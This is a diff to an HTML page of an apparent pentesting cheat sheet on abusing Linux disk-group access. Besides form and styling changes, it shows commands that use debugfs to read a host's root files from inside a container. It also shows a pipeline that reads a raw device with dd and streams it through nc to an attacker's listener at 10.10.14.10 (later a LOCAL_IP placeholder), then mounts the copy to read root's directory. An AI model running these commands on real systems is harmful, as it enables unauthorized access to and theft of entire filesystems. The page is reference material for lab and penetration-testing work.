@@ -197,47 +197,171 @@
   <li><a href="https://tldrbins.github.io/@lvm/">Lvm</a></li>
   
 </ul>
+<hr>
+<div class="content">
+<div id="params">
+	<form id="params_form" style="display: none;">
+	</form>
+	<div class="center">
+		<button id="form_btn">Show Params Form</button>
+		<button id="replace_btn" style="display: none;">Replace Params</button>
+		<button id="reset_btn" style="display: none;">Reset</button>
+		<button id="clear_btn" style="display: none;">Clear Cache</button>
+	</div>
+</div>
 
-<div class="content"><hr>
+<style>
+#params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: white;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #aaa;
+	font-family: system-ui;
+}
+
+#params * {
+    box-sizing: border-box;
+}
+
+#params input {
+  margin-bottom: 15px;
+}
+
+#params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #f5f5f5;
+}
+
+#params label {
+	color: #333333;
+	font-size: 0.9rem;
+}
+
+#params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #f5f5f5;
+	font-weight: 700;
+	background: rgba(44, 82, 179);
+}
+
+#params button:hover {
+    cursor: pointer;
+    background: rgba(44, 82, 179, 0.95);
+}
+
+.center {
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
+
+ 
+body.dark-mode #params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: #23272a;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #23272a;
+	font-family: system-ui;
+}
+
+body.dark-mode #params * {
+    box-sizing: border-box;
+}
+
+body.dark-mode #params input {
+	border-radius: 0.2em;
+	border: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input:focus {
+	margin-bottom: 15px;
+	outline: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #bdbdbd;
+}
+
+body.dark-mode #params label {
+	color: #fafafa;
+	font-size: 0.9rem;
+}
+
+body.dark-mode #params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #fafafa;
+	font-weight: 700;
+	background: #616161;
+}
+
+body.dark-mode #params button:hover {
+    cursor: pointer;
+    background: #424242;
+}
+
+
+</style>
 <h3 id="basic">Basic</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Show devices</span>
-</span></span><span class="line"><span class="cl">lsblk
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Device attributes</span>
-</span></span><span class="line"><span class="cl">blkid
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Show swap on blk</span>
-</span></span><span class="line"><span class="cl">swapon -s
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Filesystem info</span>
-</span></span><span class="line"><span class="cl">cat /etc/fstab
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Show devices
+</span></span><span class="line"><span class="cl"><span class="go">lsblk
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Device attributes
+</span></span><span class="line"><span class="cl"><span class="go">blkid
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Show swap on blk
+</span></span><span class="line"><span class="cl"><span class="go">swapon -s
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Filesystem info
+</span></span><span class="line"><span class="cl"><span class="go">cat /etc/fstab
+</span></span></span></code></pre></div></div>
 <br>
 <hr>
 <h3 id="abuse-1-read-hosts-filesystem-from-container-root">Abuse #1: Read host&rsquo;s filesystem from container (root)</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Open target device</span>
-</span></span><span class="line"><span class="cl">debugfs /dev/sda1
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Exploit</span>
-</span></span><span class="line"><span class="cl">ls /root
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Open target device
+</span></span><span class="line"><span class="cl"><span class="go">debugfs /dev/sda1
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Exploit
+</span></span><span class="line"><span class="cl"><span class="go">ls /root
+</span></span></span></code></pre></div></div>
 <br>
 <hr>
 <h3 id="abuse-2-read-containers-filesystem-from-host">Abuse #2: Read container&rsquo;s filesystem from host</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Show LVM mappings</span>
-</span></span><span class="line"><span class="cl">ls -l /dev/mapper/
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># In our local machine</span>
-</span></span><span class="line"><span class="cl">nc -lvnp <span class="m">4444</span> &gt; dm-0.gz
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Exfil filesystem (target container rootfs, e.g. dm-0)</span>
-</span></span><span class="line"><span class="cl">dd <span class="k">if</span><span class="o">=</span>/dev/dm-0 <span class="p">|</span> gzip -1 - <span class="p">|</span> nc 10.10.14.10 <span class="m">4444</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Extract dm-0</span>
-</span></span><span class="line"><span class="cl">gunzip dm-0.gz
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Mount the filesystem</span>
-</span></span><span class="line"><span class="cl">sudo mount dm-0-orig /mnt/ 
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Privilege read</span>
-</span></span><span class="line"><span class="cl">ls /mnt/root/
-</span></span></code></pre></div><p><small><em>Note: can take a long time to transfer</em></small></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Show LVM mappings
+</span></span><span class="line"><span class="cl"><span class="go">ls -l /dev/mapper/
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In our <span class="nb">local</span> machine
+</span></span><span class="line"><span class="cl"><span class="go">nc -lvnp &lt;LOCAL_PORT&gt; &gt; dm-0.gz
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Exfil filesystem <span class="o">(</span>target container rootfs, e.g. dm-0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">dd if=/dev/dm-0 | gzip -1 - | nc &lt;LOCAL_IP&gt; &lt;LOCAL_PORT&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Extract dm-0
+</span></span><span class="line"><span class="cl"><span class="go">gunzip dm-0.gz
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Mount the filesystem
+</span></span><span class="line"><span class="cl"><span class="go">sudo mount dm-0-orig /mnt/ 
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Privilege <span class="nb">read</span>
+</span></span><span class="line"><span class="cl"><span class="go">ls /mnt/root/
+</span></span></span></code></pre></div><p><small><em>Note: can take a long time to transfer</em></small></p>
 </div>
-<br></div></div>
+<br>
+</div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
